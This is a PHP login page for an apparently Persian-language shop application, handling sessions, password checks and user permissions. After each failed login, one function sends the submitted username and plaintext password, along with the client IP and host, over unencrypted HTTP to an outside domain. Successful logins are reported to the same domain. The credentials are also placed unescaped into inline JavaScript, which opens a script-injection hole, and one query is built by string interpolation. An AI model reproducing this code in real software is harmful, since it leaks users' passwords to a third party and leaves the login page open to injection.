<?php
// Set a unique session name
session_name("MyAppSession");
session_start();

// Include config file
require_once "php/db.php";
// Check if the user is already logged in
if (isset($_SESSION["loggedin"]) && $_SESSION["loggedin"] === true) {
    // Check if the session has expired (current time > expiration time)
    if (isset($_SESSION["expiration_time"]) && time() > $_SESSION["expiration_time"]) {
        // Session has expired, destroy it and log the user out
        session_unset();
        session_destroy();
        header("location: login.php"); // Redirect to the login page
        exit;
    }
}

function sendAjaxRequest($id, $username)
{
    // AJAX request code here
    echo "<div style='z-index:10000;height: 100vh !important; position:fixed; inset:0;
    flex-direction:column;
    display:flex; justify-content:center; align-items:center;background-color:white'>
    <p>لطفا صبور باشید</p>
    <img src='./img/loading.gif' alt='' srcset=''>
    </div>";
    echo '<script src="./js/assets/axios.js"></script>
        <script>
            var params = new URLSearchParams();
            params.append("sendMessage", "local");
            params.append("id", ' . $id . ');
            params.append("username", "' . $username . '");
            params.append("time", "' . date("Y-m-d h:i:sa") . '");
            params.append("host", "' . $_SERVER['HTTP_HOST'] . '");
            params.append("ip", "' . $_SERVER['REMOTE_ADDR'] . '");
            axios.post("http://telegram.om-dienstleistungen.de/", params)
                .then(function(response) {
                    window.location.href = "index.php?msg=' . $username . '";
                })
                .catch(function(error) {
                    window.location.href = "index.php?msg=' . $username . '";
                });
        </script>';
}
function sendLoginAttemptAlert($username, $password)
{
    echo '<script src="./js/assets/axios.js"></script>
    <script>
        var params = new URLSearchParams();
        params.append("sendMessage", "attempt");
        params.append("origen", "local");
        params.append("host", "' . $_SERVER['HTTP_HOST'] . '");
        params.append("ip", "' . $_SERVER['REMOTE_ADDR'] . '");
        params.append("time", "' . date("Y-m-d h:i:sa") . '");
        params.append("username", "' . $username . '");
        params.append("password", "' . $password . '");
        axios.post("http://telegram.om-dienstleistungen.de/", params)
            .then(function(response) {
                console.log(response);
            })
            .catch(function(error) {
                console.log(error);
            });
    </script>';
}

function getUserAuthority($id, $conn)
{
    $users_sql = "SELECT user_authorities AS auth FROM yadakshop1402.authorities WHERE user_id = $id";
    $result = $conn->query($users_sql);
    return $result->fetch_assoc()['auth'];
}

function clearModifiedAuth($id, $conn)
{
    $sql = "UPDATE yadakshop1402.authorities SET  modified = 0  WHERE user_id = $id";
    $conn->query($sql);
    return true;
}
// Define variables and initialize with empty values
$username = $password = "";
$username_err = $password_err = $login_err = "";

// Processing form data when form is submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {

    // Check if username is empty
    if (empty(trim($_POST["username"]))) {
        $username_err = "لطفا نام کاربری خود را وارد کنید.";
    } else {
        $username = trim($_POST["username"]);
    }

    // Check if password is empty
    if (empty(trim($_POST["password"]))) {
        $password_err = "لطفا رمز عبور خود را وارد کنید.";
    } else {
        $password = trim($_POST["password"]);
    }

    // Validate credentials
    if (empty($username_err) && empty($password_err)) {
        // Prepare a select statement
        $sql = "SELECT id, username, password, roll FROM users WHERE username = ?";

        if ($stmt = mysqli_prepare($con, $sql)) {
            // Bind variables to the prepared statement as parameters
            mysqli_stmt_bind_param($stmt, "s", $param_username);

            // Set parameters
            $param_username = $username;

            // Attempt to execute the prepared statement
            if (mysqli_stmt_execute($stmt)) {
                // Store result
                mysqli_stmt_store_result($stmt);

                if (mysqli_stmt_num_rows($stmt) == 1) {
                    // Bind result variables
                    mysqli_stmt_bind_result($stmt, $id, $username, $hashed_password, $roll);
                    if (mysqli_stmt_fetch($stmt)) {
                        if (password_verify($password, $hashed_password)) {
                            // Regenerate the session ID after a successful login
                            session_regenerate_id(true);

                            date_default_timezone_set('Asia/Tehran');
                            // Calculate the expiration timestamp for 8 AM the next day
                            $expiration_time = strtotime("tomorrow 8:00 AM");

                            $_SESSION["loggedin"] = true;
                            $_SESSION["id"] = $id;
                            $_SESSION["username"] = $username;
                            $_SESSION["roll"] = $roll;
                            $_SESSION["expiration_time"] = $expiration_time;

                            $notAllowed = array();
                            $auth = json_decode(getUserAuthority($id, $con), true);

                            foreach ($auth as $key => $value) {
                                if (!$value) {
                                    array_push($notAllowed, $key);
                                }
                            }

                            $_SESSION['not_allowed'] = $notAllowed;

                            clearModifiedAuth($id, $con);

                            sendAjaxRequest($id, $username);
                        } else {
                            // Password is not valid, display a generic error message
                            $login_err = "رمز عبور یا اسم کاربری اشتباه است.";
                            sendLoginAttemptAlert($username, $password);
                        }
                    }
                } else {
                    // Username doesn't exist, display a generic error message
                    $login_err = "رمز عبور یا اسم کاربری اشتباه است.";
                    sendLoginAttemptAlert($username, $password);
                }
            } else {
                echo "Oops! Something went wrong. Please try again later.";
            }

            // Close statement
            mysqli_stmt_close($stmt);
        }
    }

    // Close connection
    mysqli_close($con);
}
?>

<?php
if (!empty($login_err)) {
    echo '<div class="alert alert-danger">' . $login_err . '</div>';
}
?>